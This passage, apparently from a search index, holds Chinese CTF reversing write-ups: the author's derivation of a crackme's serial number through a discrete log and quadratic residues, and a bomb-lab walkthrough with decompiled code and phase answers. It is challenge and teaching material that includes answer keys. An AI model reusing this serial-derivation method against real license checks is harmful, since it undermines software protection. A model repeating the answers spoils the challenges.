\u7b97\u6cd5\u6c42\u89e3 d, \u8303\u56f4\u4e3a band = (1, 95367431640625) \u53ea\u670947 bits\u3002 kangaroo\u7b97\u6cd5\u662f\u89e3\u51b3\u533a\u95f4band = (a, b)\u4e0a\u79bb\u6563\u5bf9\u6570\u95ee\u9898\u5f88\u6709\u6548\u7684\u65b9\u6cd5,\u5728\u5e73\u5747\u610f\u4e49\u4e0b\u9700\u8981\u8fdb\u884c2 * \u221a|a-b|\u6b21\u7fa4\u64cd\u4f5c\u3002 \u671f\u671b\u6b65\u6570 2 \uff08limit^0.5)= 2 9765625, \u4e5f\u5c31\u662f\u5927\u69822000\u4e07\u6b21\u3002\u7ecf\u6d4b\u8bd5\uff0c \u5927\u698230-60\u79d2\u4e4b\u95f4\u3002 \u6211\u4eec\u5f97\u5230: d(dec) = 79821823136933 d(hex)= 4898F769D4A5 base25table=ABCDEFGHKJILMNOPQRSTUVWYZ \u662f26\u4e2a\u5927\u5199\u5b57\u6bcd\u8868\uff0c(\u6263\u9664X, \u5e76\u4e14K\uff0cI\u4e92\u6362\u4f4d\u7f6e\uff09 \u5f97\u5230 d.base25 = UYDAERFTCK \u9006\u5e8f\u540e\u5f97\u5230\uff1a s = d.base25.reverse = KCTFREADYU \u4e3a\u4e86\u9632\u6b62\u88ab\u731c\u6d4b\u5230s1\uff0c \u4f4e\u4f4d\u505a\u4e86\u4fee\u6b63\uff0c\u4fee\u6b63\u503c diff = 'U' - 'K' = 10\uff1a \u6ce8\u518c\u7801\u91cc\u7684\u91c7\u7528KCTFREADYK\uff0c s1 = KCTFREADYK + diff = KCTFREADYU s1(hex) = 4B435446524541445955 (3.2) \u89e3\u65b9\u7a0b(1) (3.2.1) \u9996\u5148\uff0c\u6839\u636e\u4e00\u822c\u7684\u4e8c\u6b21\u5269\u4f59\u65b9\u7a0b\uff0c \u53ef\u4ee5\u914d\u65b9\u4ee5\u540e\u6c42\u89e3\uff1a a*x^2 + bx + c = 0 mod p \u4e24\u8fb9\u4e58\u4ee54a\u914d\u65b9: 4a 2*x 2 + 4a*bx + 4ac = 0 mod p \u65b9\u7a0b\u53d8\u4e3a (2a*x + b) 2 = b 2 - 4ac \u4ee4delta = b^2 - 4ac, \u5c31\u53ef\u4ee5\u5f52\u7ed3\u4e3a\u6c42 sqroot(delta) mod p\uff1a x1 = (-b - sqroot(delta))/(2a) mod p x2 = (-b + sqroot(delta))/(2a) mod p \u6ce8\u610f\uff0c\u8fd9\u91cc\u7684\u9664\u6cd5\u662f\u6a21P\u7684\u9006\u3002 (3.2.2) \u65b9\u7a0b(1)\u89e3\u91ca\u5982\u4e0b\uff1a 64*(s2 - s1)^4 + (s2-s1)^2 + 3 - s1 = 0 mod P F(x)\u662f\u4e00\u4e2a4\u6b21\u591a\u9879\u5f0f\uff1aF(x) = a4 x^4 + a2 x^2 + a0 \u8fd9\u91cc\u53d6x = s2 - s1, a4 = 64, a2 = 1, a0 = 3 F(x) \u53ef\u4ee5\u7b80\u5316\u4e3a\u4e00\u4e2a\u4e8c\u6b21\u5269\u4f59\u65b9\u7a0b\uff0c 64*(s2 - s1)^4 + (s2-s1)^2 + 3 = s1 mod P ... (4) 64*r^2 + r + 3 = s1 mod p , => 64*r^2 + r = (s1 - 3) mod p \u4e24\u8fb9\u4e58\u4ee54a, \u52a0\u4e0a1: 4 64 64 r^2 + 256 r + 1 = 256*(s1-3) + 1 mod p (128r + 1)^2 = 256*(s1-3) + 1 mod p s1 = 4B435446524541445955, s1-3 = 4B435446524541445952 \u4e58\u4ee5256\u5c31\u662f\u5de6\u79fb\u4e00\u4e2a\u5b57\u8282\uff1a (3.2.3) \u65b9\u7a0b\u7b80\u5316\u4e3a\uff1a (128r + 1)^2 = 4B43544652454144595201 mod p ...(5) r = (sqroot(4B43544652454144595201, P) - 1)/128 \u7b2c\u4e00\u6b65\uff0c\u65b9\u7a0b(5)\u6c42\u89e3\u9996\u5148\u6c42\u5f97\u4e24\u4e2a\u89e3r1,r2\u3002 Y = 4B43544652454144595201 sqroot(Y, P)\uff0c RDLP \u6c42\u89e3\u3002 Two sqroots of Y (mod P), in HEX BASE. G1-258B783A22015B08A6C64FB55644BAACCDA201473D4B6786821056707C680B58 G2-5A7487C5DDFEA4F75939B04AA9BB4553325DFEB8C2B498797DEFA98F8397F495 \u518d\u6c42\u5f97\uff1a r1=2D4B16F0744402B6114D8C9F6AAC8975599B44028E7A96CF0D0420ACE0F8D010 r2=1CB4E90F8BBBFD49EEB273609553768AA664BBFD71856930F2FBDF531F072FE5 \u7136\u540er1,r2\u5206\u522b\u6c42\u89e3\u4e8c\u6b21\u5269\u4f59\uff0c\u5404\u6709\u4e24\u4e2a\u89e3\uff0c\u6240\u4ee5\u4e00\u5171\u67094\u4e2a\u89e3\u3002 \u7b2c\u4e8c\u6b65\uff0c \u89e3\u51fa x^2 = r mod p , \u53ef\u7528RDLP\u6c42\u89e3\u3002 root(r1)= x2-3CCA260F45B79993C67F35F7A716B28BBA591BA35593C8DEB9B959C2CE43AE21 x3-4335D9F0BA48666C3980CA0858E94D7445A6E45CAA6C37214646A63D31BC51CC root(r2)= x4-7C93A389F44E31BC25D90165624292389B47C2C27F60286FF627A6FC3DB84BC4 x1-036C5C760BB1CE43DA26FE9A9DBD6DC764B83D3D809FD79009D85903C247B429 \u8fd94\u4e2a\u89e3\u8bb0\u4f5cx1,x2,x3,x4, \u6070\u597d\u6bcf\u4e00\u4e2a\u90fd\u5206\u5e03\u5728(1, P)\u76844\u4e2a\u533a\u95f4\u4e4b\u4e00\u3002 (0-\u00bc), (\u00bc-\u00bd), (\u00bd - \u00be), (\u00be, 1) \u7136\u540e\uff1a s2 = s1 + X , \u4e5f\u67094\u4e2as2\uff0c \u5e76\u8f6c\u4e3a10\u8fdb\u5236\u8868\u793a\u3002 \u6700\u540e\u5408\u5e76\uff1a SN = \"s2\" + \"XXXX\" + \"s1\" 4\u4e2a\u89e3\u4e3a\uff1a SN_X1 = KCTFREADYKXXXX1548396171915056368526513804948765619094392315806578461796159505215278288254 SN_X2= KCTFREADYKXXXX27495936700183671733408543181646240981077460232127048216208422649817010276214 SN_X3= KCTFREADYKXXXX30400107918474425978376949322697712945557532100693234514359350753673330338593 SN_X4= KCTFREADYKXXXX56347648446743041343258978699395188307540600017013704268771613898275062326553 \u9898\u76ee\u53d6\u6700\u5c0f\u7684\u89e3\uff1a x < P/4\uff0cSN_X1 \u4e3a\u6709\u6548\u7b54\u6848\u3002","title":"CTF 2019Q2 readyu crackme \u51fa\u9898\u601d\u8def"},{"location":"reverse/CTF 2019Q2 readyu crackme/#ctf-2019q2-readyu-crackme","text":"(1) \u5e8f\u5217\u53f7 \u672c\u9898\u552f\u4e00\u5e8f\u5217\u53f7SN\u4e3a\uff1a KCTFREADYKXXXX1548396171915056368526513804948765619094392315806578461796159505215278288254 (2) \u65b9\u7a0b \u7b97\u6cd5\u57fa\u4e8e\u4e8c\u6b21\u5269\u4f59\u4e0e\u79bb\u6563\u5bf9\u6570\uff0c \u5efa\u7acb\u4e862\u4e2a\u65b9\u7a0b (1) (2) \u89c1\u4e0b\u6587\u3002\u5e76\u4e14\u6a21\u540c\u4e00\u4e2a\u7d20\u6570\u3002\u6240\u4ee5\u6682\u5b9a\u53d6\u540d \u201c\u4e00\u77f3\u4e8c\u9e1f\u201d\u3002 P=2^255-19 \u662f\u4e00\u4e2a\u7d20\u6570, base16 \u6216\u8005base10\u5982\u4e0b\uff1a P(hex)=7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFED P(dec)=57896044618658097711785492504343953926634992332820282019728792003956564819949 \u5e8f\u5217\u53f7\u683c\u5f0f\u4e3a\u4e24\u6bb5\u5b57\u7b26\uff0c + \u8868\u793a\u5b57\u7b26\u4e32\u5408\u5e76\uff1a SN = \u201cs1\u201d + \u201cXXXX\u201d + \u201cs2\u201d s1\u662f\u5927\u5199\u5b57\u6bcd\u4e32\uff0c s2\u662f\u5341\u8fdb\u5236\u6570\u5b57\u4e32\u3002 \u6570\u503c\u4e0a\uff0c 1 < s1, s2 < P \u5176\u4e2d, s1,s2 \u662f\u672a\u77e5\u91cf\uff0c d\u662fs1\u53d8\u6362\u800c\u6765\u7684\u672a\u77e5\u91cf\u3002 s1\u9006\u5e8f\u53d8\u6362\uff0c\u52a0\u4e0a\u6700\u5c0f\u4f4d\u8c03\u6574\uff0c \u7136\u540ebase25\u89e3\u7801\u5f97\u5230d. (Y,G)\u5185\u7f6e\u4e8e\u7a0b\u5e8f\u4e4b\u4e2d\u3002 64*(s2-s1)^4 + (s2-s1)^2 + 3 = s1 mod P ... (1) G^d = Y mod P ... (2) G,Y \u662f\u5df2\u77e5\u6570, \u8303\u56f4 [ 1, P-1]: Y = 100 G = 9230197858975018299629857977411527954550899478307510809210520967346958600039 (3) \u89e3\u6cd5 \u89e3\u6cd5\uff1a\u9996\u5148\u89e3\u65b9\u7a0b2\uff0c \u5f97\u5230d \uff0c \u8f6c\u6362\u4e3as1 \uff1b \u7136\u540e\u518d\u89e3\u65b9\u7a0b1 \u5f97\u5230s2\u3002 (3.1) \u89e3\u65b9\u7a0b(2) \u65b9\u7a0b(2)\u89e3\u91ca\u5982\u4e0b\uff1a d = base25.reverse(s1) ....(3) \u968f\u673a\u9a8c\u8bc1\u4efb\u4f55\u4e00\u5bf9\uff0c\u7ed3\u679c\u90fd\u662f\u4e00\u6837\u7684\u3002 (Y,G) = 1 2 3 4 5 6 7 \"100,9230197858975018299629857977411527954550899478307510809210520967346958600039\", \"101,50414221767352083765613498524674590844333823720255656432490557866777248860034\", \"102,38377684164112914669201831650756813551072223314592288217929947158283532270268\", \"103,13436195533519778671648120865743178010431697022400670384909515001970400645091\", \u6bd4\u5982 Y=100, 1 G=9230197858975018299629857977411527954550899478307510809210520967346958600039 G^d = Y mod P , P\u662f256bit\u7684\u5927\u7d20\u6570\u3002 \u8868\u9762\u4e00\u770b\uff0c\u9700\u8981\u89e3256 bit\u7684\u79bb\u6563\u5bf9\u6570\uff0c \u9700\u8981\u89e3\u79bb\u6563\u5bf9\u6570\u5de5\u5177\uff0c\u6bd4\u5982gdlog\u3002 GDLOG Implementation of the GNFS for discrete logarithm problem in GF(p) https://sourceforge.net/projects/gdlog/ \u4f46\u672c\u9898\uff0c\u7a0b\u5e8f\u91cc\u7ed9\u51fa\u4e86\u6761\u4ef6\uff0c d \u8f6c\u5316\u4e3abase25\u5b57\u7b26\u65f6\uff0c\u6700\u957f\u4e3a10\u4e2a\u5b57\u8282\u3002 \u6240\u4ee5\u6570\u91cf\u7ea7\u6781\u5927\u5730\u7f29\u5c0f\uff0c \u53ea\u670947bits\u3002 \u4e5f\u5c31\u662fd < limit, limit = 25^10 = 95367431640625 \u3002 \u56e0\u6b64\uff0c\u7528 pollard kangaroo \u7b97\u6cd5\u6c42\u89e3 d, \u8303\u56f4\u4e3a band = (1, 95367431640625) \u53ea\u670947 bits\u3002 kangaroo\u7b97\u6cd5\u662f\u89e3\u51b3\u533a\u95f4band = (a, b)\u4e0a\u79bb\u6563\u5bf9\u6570\u95ee\u9898\u5f88\u6709\u6548\u7684\u65b9\u6cd5,\u5728\u5e73\u5747\u610f\u4e49\u4e0b\u9700\u8981\u8fdb\u884c2 * \u221a|a-b|\u6b21\u7fa4\u64cd\u4f5c\u3002 \u671f\u671b\u6b65\u6570 2 \uff08limit^0.5)= 2 9765625, \u4e5f\u5c31\u662f\u5927\u69822000\u4e07\u6b21\u3002\u7ecf\u6d4b\u8bd5\uff0c \u5927\u698230-60\u79d2\u4e4b\u95f4\u3002 \u6211\u4eec\u5f97\u5230: d(dec) = 79821823136933 d(hex)= 4898F769D4A5 base25table=ABCDEFGHKJILMNOPQRSTUVWYZ \u662f26\u4e2a\u5927\u5199\u5b57\u6bcd\u8868\uff0c(\u6263\u9664X, \u5e76\u4e14K\uff0cI\u4e92\u6362\u4f4d\u7f6e\uff09 \u5f97\u5230 d.base25 = UYDAERFTCK \u9006\u5e8f\u540e\u5f97\u5230\uff1a s = d.base25.reverse = KCTFREADYU \u4e3a\u4e86\u9632\u6b62\u88ab\u731c\u6d4b\u5230s1\uff0c \u4f4e\u4f4d\u505a\u4e86\u4fee\u6b63\uff0c\u4fee\u6b63\u503c diff = 'U' - 'K' = 10\uff1a \u6ce8\u518c\u7801\u91cc\u7684\u91c7\u7528KCTFREADYK\uff0c s1 = KCTFREADYK + diff = KCTFREADYU s1(hex) = 4B435446524541445955 (3.2) \u89e3\u65b9\u7a0b(1) (3.2.1) \u9996\u5148\uff0c\u6839\u636e\u4e00\u822c\u7684\u4e8c\u6b21\u5269\u4f59\u65b9\u7a0b\uff0c \u53ef\u4ee5\u914d\u65b9\u4ee5\u540e\u6c42\u89e3\uff1a a*x^2 + bx + c = 0 mod p \u4e24\u8fb9\u4e58\u4ee54a\u914d\u65b9: 4a 2*x 2 + 4a*bx + 4ac = 0 mod p \u65b9\u7a0b\u53d8\u4e3a (2a*x + b) 2 = b 2 - 4ac \u4ee4delta = b^2 - 4ac, \u5c31\u53ef\u4ee5\u5f52\u7ed3\u4e3a\u6c42 sqroot(delta) mod p\uff1a x1 = (-b - sqroot(delta))/(2a) mod p x2 = (-b + sqroot(delta))/(2a) mod p \u6ce8\u610f\uff0c\u8fd9\u91cc\u7684\u9664\u6cd5\u662f\u6a21P\u7684\u9006\u3002 (3.2.2) \u65b9\u7a0b(1)\u89e3\u91ca\u5982\u4e0b\uff1a 64*(s2 - s1)^4 + (s2-s1)^2 + 3 - s1 = 0 mod P F(x)\u662f\u4e00\u4e2a4\u6b21\u591a\u9879\u5f0f\uff1aF(x) = a4 x^4 + a2 x^2 + a0 \u8fd9\u91cc\u53d6x = s2 - s1, a4 = 64, a2 = 1, a0 = 3 F(x) \u53ef\u4ee5\u7b80\u5316\u4e3a\u4e00\u4e2a\u4e8c\u6b21\u5269\u4f59\u65b9\u7a0b\uff0c 64*(s2 - s1)^4 + (s2-s1)^2 + 3 = s1 mod P ... (4) 64*r^2 + r + 3 = s1 mod p , => 64*r^2 + r = (s1 - 3) mod p \u4e24\u8fb9\u4e58\u4ee54a, \u52a0\u4e0a1: 4 64 64 r^2 + 256 r + 1 = 256*(s1-3) + 1 mod p (128r + 1)^2 = 256*(s1-3) + 1 mod p s1 = 4B435446524541445955, s1-3 = 4B435446524541445952 \u4e58\u4ee5256\u5c31\u662f\u5de6\u79fb\u4e00\u4e2a\u5b57\u8282\uff1a (3.2.3) \u65b9\u7a0b\u7b80\u5316\u4e3a\uff1a (128r + 1)^2 = 4B43544652454144595201 mod p ...(5) r = (sqroot(4B43544652454144595201, P) - 1)/128 \u7b2c\u4e00\u6b65\uff0c\u65b9\u7a0b(5)\u6c42\u89e3\u9996\u5148\u6c42\u5f97\u4e24\u4e2a\u89e3r1,r2\u3002 Y = 4B43544652454144595201 sqroot(Y, P)\uff0c RDLP \u6c42\u89e3\u3002 Two sqroots of Y (mod P), in HEX BASE. G1-258B783A22015B08A6C64FB55644BAACCDA201473D4B6786821056707C680B58 G2-5A7487C5DDFEA4F75939B04AA9BB4553325DFEB8C2B498797DEFA98F8397F495 \u518d\u6c42\u5f97\uff1a r1=2D4B16F0744402B6114D8C9F6AAC8975599B44028E7A96CF0D0420ACE0F8D010 r2=1CB4E90F8BBBFD49EEB273609553768AA664BBFD71856930F2FBDF531F072FE5 \u7136\u540er1,r2\u5206\u522b\u6c42\u89e3\u4e8c\u6b21\u5269\u4f59\uff0c\u5404\u6709\u4e24\u4e2a\u89e3\uff0c\u6240\u4ee5\u4e00\u5171\u67094\u4e2a\u89e3\u3002 \u7b2c\u4e8c\u6b65\uff0c \u89e3\u51fa x^2 = r mod p , \u53ef\u7528RDLP\u6c42\u89e3\u3002 root(r1)= x2-3CCA260F45B79993C67F35F7A716B28BBA591BA35593C8DEB9B959C2CE43AE21 x3-4335D9F0BA48666C3980CA0858E94D7445A6E45CAA6C37214646A63D31BC51CC root(r2)= x4-7C93A389F44E31BC25D90165624292389B47C2C27F60286FF627A6FC3DB84BC4 x1-036C5C760BB1CE43DA26FE9A9DBD6DC764B83D3D809FD79009D85903C247B429 \u8fd94\u4e2a\u89e3\u8bb0\u4f5cx1,x2,x3,x4, \u6070\u597d\u6bcf\u4e00\u4e2a\u90fd\u5206\u5e03\u5728(1, P)\u76844\u4e2a\u533a\u95f4\u4e4b\u4e00\u3002 (0-\u00bc), (\u00bc-\u00bd), (\u00bd - \u00be), (\u00be, 1) \u7136\u540e\uff1a s2 = s1 + X , \u4e5f\u67094\u4e2as2\uff0c \u5e76\u8f6c\u4e3a10\u8fdb\u5236\u8868\u793a\u3002 \u6700\u540e\u5408\u5e76\uff1a SN = \"s2\" + \"XXXX\" + \"s1\" 4\u4e2a\u89e3\u4e3a\uff1a SN_X1 = KCTFREADYKXXXX1548396171915056368526513804948765619094392315806578461796159505215278288254 SN_X2= KCTFREADYKXXXX27495936700183671733408543181646240981077460232127048216208422649817010276214 SN_X3= KCTFREADYKXXXX30400107918474425978376949322697712945557532100693234514359350753673330338593 SN_X4= KCTFREADYKXXXX56347648446743041343258978699395188307540600017013704268771613898275062326553 \u9898\u76ee\u53d6\u6700\u5c0f\u7684\u89e3\uff1a x < P/4\uff0cSN_X1 \u4e3a\u6709\u6548\u7b54\u6848\u3002","title":"CTF 2019Q2 readyu crackme \u51fa\u9898\u601d\u8def"},{"location":"reverse/bomb-whu/","text":"bomb-whu \u00b6 \u7b2c\u4e00\u5173 \u00b6 With great power comes great responsibility. \u7b2c\u4e8c\u5173 \u00b6 \u5148\u7ed5\u8fc7\u7b2c\u4e00\u4e2a\u9650\u5236\uff0c\u5373\u524d\u4e24\u4e2a\u5fc5\u987b\u662f3 \u548c5\u8bd5\u4e86\u534a\u5929 \u770b\u4e00\u4e0b\u6e90\u4ee3\u7801\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 int __cdecl phase_2 ( int a1 ) { int result ; // eax@4 char * v2 ; // ebx@6 int v3 ; // [sp+18h] [bp-24h]@1 int v4 ; // [sp+1Ch] [bp-20h]@2 char v5 ; // [sp+20h] [bp-1Ch]@8 char v6 ; // [sp+30h] [bp-Ch]@6 read_six_numbers ( a1 , & v3 ); if ( v3 != 3 || v4 != 5 ) explode_bomb (); v2 = & v5 ; do { result = * (( _DWORD * ) v2 - 1 ) + * (( _DWORD * ) v2 - 2 ); if ( * ( _DWORD * ) v2 != result ) explode_bomb (); v2 += 4 ; } while ( v2 != & v6 ); return result ; } \u8bd5\u4e00\u4e0b 3 5 8 13 21 34 \u679c\u7136\u771f\u7684\u662f\u6590\u6ce2\u90a3\u5951\u6570\u5217 \u7b2c\u4e09\u5173 \u00b6 \u4ed4\u7ec6\u5206\u6790\u4e00\u4e0b\u903b\u8f91 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 int __cdecl phase_3 ( int a1 ) { signed int v1 ; // eax@4 int v2 ; // eax@6 int v3 ; // eax@8 int v4 ; // eax@10 int v5 ; // eax@12 int v6 ; // eax@14 int v7 ; // eax@16 int result ; // eax@18 int v9 ; // [sp+18h] [bp-14h]@1 int v10 ; // [sp+1Ch] [bp-10h]@1 if ( __isoc99_sscanf ( a1 , \"%d %d\" , & v9 , & v10 ) <= 1 ) // v9\u8981\u5c0f\u4e8e\u7b49\u4e8e5 explode_bomb (); switch ( v9 ) { case 1 : v1 = 0 ; goto LABEL_6 ; case 0 : v1 = 985 ; LABEL_6 : v2 = v1 - 329 ; goto LABEL_8 ; case 2 : v2 = 0 ; LABEL_8 : v3 = v2 + 191 ; goto LABEL_10 ; case 3 : v3 = 0 ; LABEL_10 : v4 = v3 - 317 ; goto LABEL_12 ; case 4 : v4 = 0 ; LABEL_12 : v5 = v4 + 317 ; goto LABEL_14 ; case 5 : v5 = 0 ; LABEL_14 : v6 = v5 - 317 ; goto LABEL_16 ; case 6 : v6 = 0 ; LABEL_16 : v7 = v6 + 317 ; break ; case 7 : v7 = 0 ; break ; default : explode_bomb (); return result ; } result = v7 - 317 ; if ( v9 > 5 || result != v10 ) //\u5c0f\u4e8e\u7b49\u4e8e5\u4e14result\u5fc5\u987b\u7b49\u4e8ev10 explode_bomb (); return result ; } \u7136\u540e\u8d70\u4e00\u4e2acase\u5c31\u884c \u7b2c\u56db\u5173 \u00b6 \u5173\u952e\u4ee3\u7801 1 2 3 4 5 6 7 8 9 10 11 12 13 int __cdecl phase_4 ( int a1 ) { int result ; // eax@4 int v2 ; // [sp+18h] [bp-14h]@1 int v3 ; // [sp+1Ch] [bp-10h]@1 if ( __isoc99_sscanf ( a1 , \"%d %d\" , & v3 , & v2 ) != 2 || ( unsigned int )( v2 - 2 ) > 2 ) explode_bomb (); //\u5fc5\u987b\u662f2\u4e2a\u53c2\u6570\u4e14v2-2 <= 2 result = func4 ( 5 , v2 ); if ( result != v3 ) //result\u5fc5\u987b\u4e3av3\uff0c\u4e5f\u5c31\u662f\u8bf4\u4f20\u5165\u4e00\u4e2av2\u8ba1\u7b97\u51fa\u6765\u7684\u503c\u8981\u548cv3\u76f8\u7b49 explode_bomb (); return result ; } \u5206\u6790\u4e00\u4e0b func4 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 int __cdecl func4 ( int a1 , int a2 ) //a2\u662f\u53ef\u4ee5\u63a7\u5236\u7684\u53c2\u6570 { int result ; // eax@2 int v3 ; // edi@3 if ( a1 <= 0 ) { result = 0 ; } else { result = a2 ; if ( a1 != 1 ) { v3 = func4 ( a1 - 1 , a2 ) + a2 ; result = v3 + func4 ( a1 - 2 , a2 ); } } return result ; } \u6ce8\u610f\u6b64\u5904 (unsigned int)(v2 - 2) > 2 \u662f\u65e0\u7b26\u53f7\u6570\u6bd4\u8f83\uff0c\u8d1f\u6570\u4f1a\u53d8\u6210\u5f88\u5927\u7684\u6570\u5b57 \u8f93\u516536 \u548c 3\u5373\u53ef \u7b2c\u4e94\u5173 \u00b6 \u8f93\u5165 beldog \u5373\u53ef \u7b2c\u516d\u5173 \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 int __cdecl phase_6 ( int a1 ) { signed int v1 ; // esi@1 int v2 ; // ebx@5 signed int v3 ; // ebx@6 _DWORD * v4 ; // edx@11 signed int v5 ; // eax@11 int v6 ; // ecx@15 int v7 ; // ebx@17 char * v8 ; // eax@17 int i ; // ecx@17 int v10 ; // edx@18 signed int v11 ; // esi@20 int result ; // eax@21 int v13 ; // [sp+Ch] [bp-40h]@7 int v14 [ 6 ]; // [sp+10h] [bp-3Ch]@1 int v15 ; // [sp+28h] [bp-24h]@14 char v16 ; // [sp+2Ch] [bp-20h]@17 char v17 ; // [sp+40h] [bp-Ch]@18 read_six_numbers ( a1 , v14 ); v1 = 0 ; while ( 1 ) { if ( ( unsigned int )( v14 [ v1 ] - 1 ) > 5 ) explode_bomb (); if ( ++ v1 == 6 ) break ; v3 = v1 ; do { if ( * ( & v13 + v1 ) == v14 [ v3 ] ) explode_bomb (); ++ v3 ; } while ( v3 <= 5 ); } v2 = 0 ; do { v6 = v14 [ v2 ]; if ( v6 <= 1 ) { v4 = & node1 ; } else { v5 = 1 ; v4 = & node1 ; do { v4 = ( _DWORD * ) v4 [ 2 ]; ++ v5 ; } while ( v5 != v6 ); } * ( & v15 + v2 ++ ) = ( int ) v4 ; } while ( v2 != 6 ); v7 = v15 ; v8 = & v16 ; for ( i = v15 ; ; i = v10 ) { v10 = * ( _DWORD * ) v8 ; * ( _DWORD * )( i + 8 ) = * ( _DWORD * ) v8 ; v8 += 4 ; if ( v8 == & v17 ) break ; } * ( _DWORD * )( v10 + 8 ) = 0 ; v11 = 5 ; do { result = ** ( _DWORD ** )( v7 + 8 ); if ( * ( _DWORD * ) v7 > result ) explode_bomb (); v7 = * ( _DWORD * )( v7 + 8 ); -- v11 ; } while ( v11 ); return result ; } \u8f93\u5165 1 2 3 4 5 6\u5b58\u5165\u7684\u6570\u636e \u5b66\u4e60\u4e00\u4e0b\uff0c\u6b64\u65f6\u53ef\u4ee5\u901a\u8fc7esi\u5bc4\u5b58\u5668\u8fdb\u884c\u53d8\u5740\u5bfb\u5740 \u7b2c\u4e00\u4e2a\u5faa\u73af\u7684v13\u8fd9\u4e2a\u53d8\u91cf\u5f88\u795e\u5947\uff0c\u4e4b\u524d\u6839\u672c\u6ca1\u5b9a\u4e49\u554a\uff0c\u81ea\u5df1\u8c03\u8bd5\u6765\u770b\u4e00\u4e0b \u7136\u540e\u5c06\u6570\u636e\u5b58\u5165 \u800c\u6b64\u65f6 \u90a3\u5927\u6982\u5c31\u662f\u53d6\u4e4b\u524d\u7684\u90a3\u4e2a\u6570\u5b57\u4e86\u4e8e\u662f\u8fd9\u6bb5\u4ee3\u7801\u7684\u542b\u4e49\uff1a 1 \u5c31\u662f\u6bcf\u4e2a\u6570\u5fc5\u987b\u90fd\u5c0f\u4e8e6\u5e76\u4e14\u4e92\u4e0d\u76f8\u7b49 \u63a5\u4e0b\u6765\u770b\u4e0b\u4e00\u4e2a\u5faa\u73af 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 v2 = 0 ; do { v6 = v14 [ v2 ]; //\u53d6\u51fav14\u6570\u7ec4\u7b2cv2\u4e2a\u76f8\u5f53\u4e8e\u904d\u5386\u6570\u7ec4 if ( v6 <= 1 ) { v4 = & node1 ; } else { v5 = 1 ; v4 = & node1 ; do { v4 = ( _DWORD * ) v4 [ 2 ]; //\u6307\u9488+2\uff0cv4\u5728\u4e0d\u65ad\u5730\u53d8\u5316 ++ v5 ; } while ( v5 != v6 ); } * ( & v15 + v2 ++ ) = ( int ) v4 ; //v15\u53c8\u6ca1\u6709\u5b9a\u4e49 } while ( v2 != 6 ); //\u8fdb\u884c6\u6b21\u5faa\u73af \u4e0b\u4e00\u4e2a\u5faa\u73af 1 2 3 4 5 6 7 8 9 10 v7 = v15 ; v8 = & v16 ; for ( i = v15 ; ; i = v10 ) { v10 = * ( _DWORD * ) v8 ; * ( _DWORD * )( i + 8 ) = * ( _DWORD * ) v8 ; v8 += 4 ; if ( v8 == & v17 ) break ; } \u6b64\u65f6\u770b\u5230edx\u7684\u503c \u91cd\u70b9\u662f\u8fd9\u4e2a\u6bd4\u8f83 \u53c2\u8003 \u00b6","title":"bomb-whu"},{"location":"reverse/bomb-whu/#bomb-whu","text":"","title":"bomb-whu"},{"location":"reverse/bomb-whu/#_1","text":"With great power comes great responsibility.","title":"\u7b2c\u4e00\u5173"},{"location":"reverse/bomb-whu/#_2","text":"\u5148\u7ed5\u8fc7\u7b2c\u4e00\u4e2a\u9650\u5236\uff0c\u5373\u524d\u4e24\u4e2a\u5fc5\u987b\u662f3 \u548c5\u8bd5\u4e86\u534a\u5929 \u770b\u4e00\u4e0b\u6e90\u4ee3\u7801\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 int __cdecl phase_2 ( int a1 ) { int result ; // eax@4 char * v2 ; // ebx@6 int v3 ; // [sp+18h] [bp-24h]@1 int v4 ; // [sp+1Ch] [bp-20h]@2 char v5 ; // [sp+20h] [bp-1Ch]@8 char v6 ; // [sp+30h] [bp-Ch]@6 read_six_numbers ( a1 , & v3 ); if ( v3 != 3 || v4 != 5 ) explode_bomb (); v2 = & v5 ; do { result = * (( _DWORD * ) v2 - 1 ) + * (( _DWORD * ) v2 - 2 ); if ( * ( _DWORD * ) v2 != result ) explode_bomb (); v2 += 4 ; } while ( v2 != & v6 ); return result ; } \u8bd5\u4e00\u4e0b 3 5 8 13 21 34 \u679c\u7136\u771f\u7684\u662f\u6590\u6ce2\u90a3\u5951\u6570\u5217","title":"\u7b2c\u4e8c\u5173"},{"location":"reverse/bomb-whu/#_3","text":"\u4ed4\u7ec6\u5206\u6790\u4e00\u4e0b\u903b\u8f91 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 int __cdecl phase_3 ( int a1 ) { signed int v1 ; // eax@4 int v2 ; // eax@6 int v3 ; // eax@8 int v4 ; // eax@10 int v5 ; // eax@12 int v6 ; // eax@14 int v7 ; // eax@16 int result ; // eax@18 int v9 ; // [sp+18h] [bp-14h]@1 int v10 ; // [sp+1Ch] [bp-10h]@1 if ( __isoc99_sscanf ( a1 , \"%d %d\" , & v9 , & v10 ) <= 1 ) // v9\u8981\u5c0f\u4e8e\u7b49\u4e8e5 explode_bomb (); switch ( v9 ) { case 1 : v1 = 0 ; goto LABEL_6 ; case 0 : v1 = 985 ; LABEL_6 : v2 = v1 - 329 ; goto LABEL_8 ; case 2 : v2 = 0 ; LABEL_8 : v3 = v2 + 191 ; goto LABEL_10 ; case 3 : v3 = 0 ; LABEL_10 : v4 = v3 - 317 ; goto LABEL_12 ; case 4 : v4 = 0 ; LABEL_12 : v5 = v4 + 317 ; goto LABEL_14 ; case 5 : v5 = 0 ; LABEL_14 : v6 = v5 - 317 ; goto LABEL_16 ; case 6 : v6 = 0 ; LABEL_16 : v7 = v6 + 317 ; break ; 